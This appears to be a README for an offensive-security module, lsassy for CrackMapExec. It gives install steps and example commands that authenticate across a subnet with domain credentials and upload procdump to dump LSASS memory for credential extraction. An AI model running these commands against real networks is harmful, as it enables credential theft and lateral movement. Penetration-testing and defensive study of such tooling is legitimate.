## Installation

* Copy `lsassy.py` in `[CME Path]/cme/modules`
* Reinstall CrackMapExec `python setup.py install`

## Requirements

* [lsassy](https://github.com/Hackndo/lsassy/)

## Usage

```bash
cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy
```

You can check available options using

```bash
cme smb 10.10.0.0/24 -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy --options
            TMP_DIR             Path where process dump should be saved on target system (default: C:\Windows\Temp\)
            SHARE               Share to upload procdump and dump lsass (default: C$)
            PROCDUMP_PATH       Path where procdump.exe is on your system (default: /tmp/)
            PROCDUMP_EXE_NAME   Name of the procdump executable (default: procdump.exe)
```

Options can be set using

```bash
cme smb dc01.adsec.local -d adsec.local -u jsnow -p Winter_is_coming_\! -M lsassy -o PROCDUMP_PATH='/home/pixis/Tools/' PROCDUMP_EXE_NAME='procdump.exe'
```

Have fun
